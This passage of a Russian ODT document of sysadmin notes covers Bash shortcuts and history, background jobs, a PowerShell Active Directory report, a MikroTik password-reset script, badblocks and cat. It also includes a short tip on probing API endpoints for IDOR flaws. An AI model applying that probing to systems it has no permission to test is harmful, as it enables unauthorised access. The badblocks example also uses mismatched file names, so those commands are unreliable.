      <text:p text:style-name="P13">Alt+u - сделать верхний регистр символов от позиции курсора до конца текущего слова.</text:p>
      <text:p text:style-name="P13">Alt+l - сделать нижний регистр символов от позиции курсора до конца слова.</text:p>
      <text:p text:style-name="P1">Alt+c - перевести символ под курсором в верхний регистр и перейти к концу слова.</text:p>
      <text:p text:style-name="P1">Alt+r - вернуть строку в исходное состояние.</text:p>
      <text:p text:style-name="P7">Ctrl+_ - отменить последнее действие со строкой.</text:p>
      <text:p text:style-name="P1">Совет по тестированию API</text:p>
      <text:p text:style-name="P1">У большинства API есть конечная точка для создания, удаления, обновления и чтения объекта или группы объектов. </text:p>
      <text:p text:style-name="P1">Если вы видите:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">DELETE /api/item/32 (удаление)</text:span></text:p>
      <text:p text:style-name="P1">То попробуйте:</text:p>
      <text:p text:style-name="P1">POST /api/item (создание)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">GET /api/item/33 (</text:span><text:span text:style-name="T3">чтение</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PUT /api/item/33 (</text:span><text:span text:style-name="T3">обновление</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1">Затем протестируйте каждый из них на IDOR, поочередно проверяя аутентификацию и уровни доступа к различным объектам. Методологическое тестирование - лучший способ взломать API.</text:p>
      <text:p text:style-name="P7">Иногда тестирование API усложняется тем, что мы можем не знать нужные для запроса поля или параметры. Однако есть способы найти их, например: если вы знаете поля для GET, вы так же можете отправить и PUT, изменив некоторые значения. Кроме того, есть инструменты, такие как Arjun (https://github.com/s0md3v/Arjun), которые могут находить параметры, а иногда и сами API просто возвращают сообщения об ошибках, когда какой-то из параметров отсутствует.</text:p>
      <text:p text:style-name="P1">Советы по настройке history команд в Bash:</text:p>
      <text:p text:style-name="P1">Каждая вводимая в терминале команда сохраняется в файле ~/.bash_history. Чтобы посмотреть историю команд - введите history.</text:p>
      <text:p text:style-name="P1">Настройка истории команд в Bash осуществляется путем добавления переменных окружения в файл ~/.bashrc.</text:p>
      <text:p text:style-name="P1">Чтобы изменения в ~/.bashrc вступили в силу, выполните:</text:p>
      <text:p text:style-name="P1">source ~/.bashrc</text:p>
      <text:p text:style-name="P1">1. Добавляем Отображение Даты и Времени в Bash History</text:p>
      <text:p text:style-name="P1">Иногда очень полезно узнать время, когда какая-либо команда была выполнена.</text:p>
      <text:p text:style-name="P1">Установите HISTTIMEFORMAT, чтобы сохранять время выполнения каждой команды.</text:p>
      <text:p text:style-name="P1">Для этого добавьте следующую строку в файл ~/.bashrc:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">export HISTTIMEFORMAT="%h %d %H:%M:%S "</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Теперь, набрав history, Вы получите следующий вывод:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">113 <text:s/>Jun 08 16:31:06 sudo ifconfig</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">114 <text:s/>Jun 08 16:31:10 top</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">115 <text:s/>Jun 08 16:31:19 ping disnetern.ru</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">116 <text:s/>Jun 08 16:31:22 history</text:p>
      <text:p text:style-name="P1">2. Увеличиваем Размер Хранимой Истории</text:p>
      <text:p text:style-name="P1">Увеличьте HISTSIZE - количество команд, которые необходимо запоминать в списке истории (стандартное значение - 500).</text:p>
      <text:p text:style-name="P13">export HISTSIZE=5000</text:p>
      <text:p text:style-name="P13">Увеличьте HISTFILESIZE - максимальное количество строк, содержащееся в файле истории (стандартное значение - 500).</text:p>
      <text:p text:style-name="P1">export HISTFILESIZE=5000</text:p>
      <text:p text:style-name="P1">3. Добавляем Команды Bash в Файл с Историей</text:p>
      <text:p text:style-name="P1">Bash перезаписывает файл .bash_history?</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Чтобы добавлять новые команды в файл с историей, а не переписывать его каждый раз, добавьте следующую строку в ~/.bashrc:</text:span></text:p>
      <text:p text:style-name="P1">shopt -s histappend</text:p>
      <text:p text:style-name="P1">4. Мгновенно Сохранять Историю Команд</text:p>
      <text:p text:style-name="P1">По умолчанию, Bash записывает историю команд в .bash_history, при завершении сессии.</text:p>
      <text:p text:style-name="P1">Если сессия внезапно оборвется Вы потеряете текущую историю команд.</text:p>
      <text:p text:style-name="P1">Используйте переменную $PROMPT_COMMAND, чтобы сохранять команды сразу после выполнения:</text:p>
      <text:p text:style-name="P1">Добавьте следующую строку в файл ~/.bashrc, если переменная $PROMPT_COMMAND не была задана ранее:</text:p>
      <text:p text:style-name="P1">PROMPT_COMMAND='history -a'</text:p>
      <text:p text:style-name="P1">Добавьте следующую строку, если переменная $PROMPT_COMMAND уже была задана:</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">PROMPT_COMMAND='$PROMPT_COMMAND; history -a'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">ChatGPT расширения:</text:p>
      <text:p text:style-name="P1">1. https://github.com/HorrorPills/ChatGPT-Gnome-Desktop-Extension - встраивает ChatGPT в Linux среду окружения Gnome.</text:p>
      <text:p text:style-name="P1">2. https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf - расширение для Google Chrome.</text:p>
      <text:p text:style-name="P1">3. https://github.com/wong2/chat-gpt-google-extension - интеграция этой нейросети в поисковые системы Google, Baidu, Bing, DuckDuckGo, Brave, Yahoo, Naver, Yandex, Kagi, Searx;</text:p>
      <text:p text:style-name="P1">4. https://chrome.google.com/webstore/detail/promptheus-converse-with/eipjdkbchadnamipponehljdnflolfki - подключает ИИ к голосовому помощнику;</text:p>
      <text:p text:style-name="P4">5. https://github.com/altryne/chatGPT-telegram-bot/ - помогает создать Telegram бота на ChatGPT;</text:p>
      <text:p text:style-name="P1">Запуск команд в фоновом режиме, синтаксис:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Задачу (например, команду или скрипт) можно перевести в фоновый режим, добавив символ «&amp;» в конец командной строки. Этот оператор переводит команду в фоновый режим и освобождает место в терминале. Команда, выполняемая в фоновом режиме, называется заданием. Во время работы фоновой команды можно выполнять любые другие команды. Синтаксис</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">выглядит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">следующим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">образом</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">command &amp; script-name &amp; /path/to/command arg1 arg2 &amp; command-1 | command-2 arg1 &amp; command-1 | command-2 -arg1 -arg2 &gt;/path/to/output &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Примеры</text:p>
      <text:p text:style-name="P1">Чтобы перевести команду ls в фоновый режим, введите:</text:p>
      <text:p text:style-name="P1">$ ls *.py &gt; output.txt &amp;</text:p>
      <text:p text:style-name="P17">Чтобы перевести следующую команду поиска в фоновый режим, добавьте символ «&amp;» в конец командной строки:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find . -iname "*.mp3" &gt; myplaylist.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как найти задания, работающие в фоновом режиме? Выполните следующую команду:</text:p>
      <text:p text:style-name="P1">jobs</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[1]- <text:s/>Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[2]+ <text:s/>Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Где</text:p>
      <text:p text:style-name="P1">[1] и [2] идентификаторы заданий.</text:p>
      <text:p text:style-name="P1">Чтобы отобразить идентификаторы процессов для идентификаторов заданий помимо стандартных сведений, передайте параметр -l:</text:p>
      <text:p text:style-name="P1">jobs - l</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[1]- <text:s/>7307 Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы отобразить только идентификаторы процессов, введите:</text:p>
      <text:p text:style-name="P1">jobs -p</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P1">7307</text:p>
      <text:p text:style-name="P1">7324</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как прекратить выполнение заданий, работающих в фоновом режиме? Для принудительного или постепенного завершения процесса следует использовать команду kill. Синтаксис</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">выглядит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">следующим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">образом</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill -15 PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill -9 PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall -15 process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall -9 process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как переместить процесс из фонового режима в приоритетный?</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Синтаксис</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">%JOB-ID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">ИЛИ</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fg JOB-ID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сначала следует вывести список текущих заданий с помощью команды jobs. Для этого введите:</text:p>
      <text:p text:style-name="P1">jobs -l</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[1]- <text:s/>7307 Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы перевести задание job id #2 в приоритетный режим, введите:</text:p>
      <text:p text:style-name="P1">%2</text:p>
      <text:p text:style-name="P1">ИЛИ используйте команду:</text:p>
      <text:p text:style-name="P13">fg 2</text:p>
      <text:p text:style-name="P13">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы перевести это задание обратно в фоновый режим, нажмите клавишу Z, удерживая клавишу CTRL. При этом выполнение текущего приоритетного задания будет приостановлено. Введите следующую команду, чтобы перевести задание в фоновый режим:</text:p>
      <text:p text:style-name="P1">%2 &amp;</text:p>
      <text:p text:style-name="P1">ИЛИ используйте команду:</text:p>
      <text:p text:style-name="P1">bg</text:p>
      <text:p text:style-name="P7">Теперь командное задание grep будет работать в фоновом режиме.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill Linux:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Syn: kill {option} {PID}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Search PID: pidof {name program} or use "top, htop"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">Example: kill {-1: reboot process, -9: kill process, -15: terminate process} {PID process} or {$(pidof{name program}}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">Win+Ctrl+Shift+B - </text:span><text:span text:style-name="T3">перезапускает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">видеодрайвер</text:span></text:p>
      <text:p text:style-name="P1">Powershell суточный отчет по пользователям из ActiveDirectory. Раз в сутки (через планировщик задач) скрипт опрашивает ActiveDirectory на предмет: Всего пользователей, Сколько активных, Сколько служебных, Сколько заблокированных, Сколько новых</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StartDate = (Get-Date).AddDays(-1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$NewUsers = ($Zapros).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$OFS = "`r`n" #`r`n`r`n</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">$NotFIO = ($NotSurname).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Message = "</text:span><text:span text:style-name="T3">На</text:span><text:span text:style-name="T2"> $Date </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> ActiveDirectory </text:span><text:span text:style-name="T3">всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователей</text:span><text:span text:style-name="T2"> $AllUsers </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2">: `n</text:span><text:span text:style-name="T3">Активных</text:span><text:span text:style-name="T2">: $ActiveUsers </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">служебные</text:span><text:span text:style-name="T2">: $NotFIO. `n</text:span><text:span text:style-name="T3">Заблокированных</text:span><text:span text:style-name="T2">: $DisabledUsers. `n</text:span><text:span text:style-name="T3">Новых</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователей</text:span><text:span text:style-name="T2">: $NewUsers `r`n`r`n$WhoUsers"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">После выполнения получаем файлик с текущей датой в папке temp.</text:p>
      <text:p text:style-name="P13">Скрипт переустановки пароля пользователя MikroTik:</text:p>
      <text:p text:style-name="P1"># Скрипт смены пароля пользователя</text:p>
      <text:p text:style-name="P1"># только для исполнения в терминале ROS</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># by Sertik 09/06/2020</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">{</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:global EnterString do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local cont 0; :local string ""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:while ($cont!=13) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local key ([:terminal inkey])</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:if ($key!=13) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:set string ("$string"."$char")}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:set cont $key</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:return $string}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Please, enter Username:"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local RegUser [$EnterString];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:if ([:len [/user find disabled=no name=$RegUser]]!=0) do={:put "Ok, a user with this name was found"; :put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Please, enter new password for this user:"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local newPass [$EnterString];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[/user remove $RegUser];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[/user add name=$RegUser password=$newPass group=full];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "The user has been re-created, the password has been changed";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put ("New user`s password: "."$newPass");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Don't forget to set up access restrictions based on ip addresses";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>} else={:put ("User "."$RegUser "."not found"); :put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/></text:span><text:span text:style-name="T3">}</text:span></text:p>
      <text:p text:style-name="P1">}</text:p>
      <text:p text:style-name="P1">Скрипт интересен строкой преобразования кода символа из переменной $key, сграбленного с клавиатуры терминала, в сам символ.</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">badblocks - команда для поиска и исправления поврежденных секторов на жестких дисках:</text:p>
      <text:p text:style-name="P13">Команда badblocks предназначена для поиска и исправления поврежденных секторов на жестких дисках. На сегодняшний день она в некоторой степени утратила свою актуальность из-за того, что современные жесткие диски осуществляют переназначение поврежденных секторов в автоматическом режиме сразу же после возникновения ошибок, связанных с чтением или записью данных.</text:p>
      <text:p text:style-name="P13">Тем не менее, она может использоваться для активации упомянутого механизма переназначения секторов, так как при работе в основном режиме она осуществляет посектороное чтение данных с жесткого диска, которое позволяет жесткому диску выявить и переназначить поврежденные сектора. Предупреждение: не используйте рассматриваемую команду, если не до конца уверены в правильности своих действий или не понимаете сути происходящих процессов, ведь в результате даже незначительной ошибки вы можете лишиться всех хранящихся на диске данных. Кроме того, не пытайтесь использовать эту команду по отношению к смонтированному разделу или к диску с со смонтирнованными разделами, ведь в этом случае последствия будут непредсказуемыми. Перед использованием badblocks необходимо определиться с жестким диском или его разделом, на котором нужно искать поврежденные сектора. Для этого может использоваться команда lsblk:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># lsblk -o NAME,FSTYPE,LABEL,MOUNTPOINT,MODEL</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NAME <text:s text:c="3"/>FSTYPE <text:s/>LABEL <text:s text:c="4"/>MOUNTPOINT <text:s text:c="14"/>MODEL</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">...</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">В данном случае в столбце NAME будут выводиться имена файлов устройств накопителей и их разделов (для обозначения разделов используется дополнительная нумерация), в столбце FSTYPE - названия созданных в разделах файловых систем, в столбце LABEL - метки разделов, в столбце MOUNTPOINT - пути к точкам монтирования файловых систем, а в столбце MODEL - информация о моделях устройств.</text:p>
      <text:p text:style-name="P1">Базовый синтаксис команды:</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt;</text:p>
      <text:p text:style-name="P1">Параметр -v используется для вывода информации о ходе процесса проверки жесткого диска.</text:p>
      <text:p text:style-name="P1">Если вам по какой-либо причине понадобится запретить использование поврежденных секторов на уровне файловой системы вы всегда можете сохранить список этих секторов и передать его утилите e2fsck. Это делается следующим образом:</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt; &gt; /tmp/badblocks.txt</text:p>
      <text:p text:style-name="P1"># e2fsck -l /tmp/bad-blocks.txt /dev/&lt;имя файла раздела или устройства&gt;</text:p>
      <text:p text:style-name="P1"># rm /tmp/badblocks.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Однако, в большинстве случаев будет достаточно однокртного посектороного чтения данных из раздела или со всего устройства.</text:span></text:p>
      <text:p text:style-name="P1">Примеры использования</text:p>
      <text:p text:style-name="P1">1. Выбор раздела жесткого диска для проверки</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># lsblk -o NAME,FSTYPE,LABEL,MOUNTPOINT,MODEL</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NAME <text:s text:c="3"/>FSTYPE <text:s/>LABEL <text:s text:c="4"/>MOUNTPOINT <text:s text:c="14"/>MODEL</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sdb <text:s text:c="47"/>MAXTOR STM316081</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">├─sdb4 <text:s/>ext4 <text:s text:c="3"/>home <text:s text:c="5"/>/home <text:s text:c="19"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">├─sdb2 <text:s/>ext4 <text:s text:c="3"/>Debian <text:s text:c="28"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">└─sdb1 <text:s/>swap <text:s text:c="38"/></text:p>
      <text:p text:style-name="P1">...</text:p>
      <text:p text:style-name="P1">Выберем раздел с корневой файловой сситемой дистрибутива Debian (с соотвествующей меткой), который в данный момент не смонтирован. Ему соответствует файл устройства sdb2.</text:p>
      <text:p text:style-name="P1">2. Проверка выбранного раздела на наличие поврежденных секторов</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># badblocks -v /dev/sdb2</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Checking blocks 0 to 12697599</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Checking for bad blocks (read-only test): <text:s/>done <text:s text:c="42"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Pass completed, 0 bad blocks found. </text:span><text:span text:style-name="T3">(0/0/0 errors)</text:span></text:p>
      <text:p text:style-name="P7">Очевидно, что в ходе проверки раздела поврежденных секторов не было обнаружено.</text:p>
      <text:p text:style-name="P1">Объединение файлов командой cat:</text:p>
      <text:p text:style-name="P1">Команду cat в большинстве случаев используют только для просмотра файлов. На самом деле одно из ее предназначений это конкатенация (объединение) файлов. А название команды происходит от слова catenate (сцепить), то есть присоединение одного после другого.</text:p>
      <text:p text:style-name="P1">Под объединением файлов понимается их соединение. Например, если мы имеем два текстовых файла и в одном из них записана строка:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">А</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">другом</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">То после объединения мы получим файл с двумя строками:</text:p>
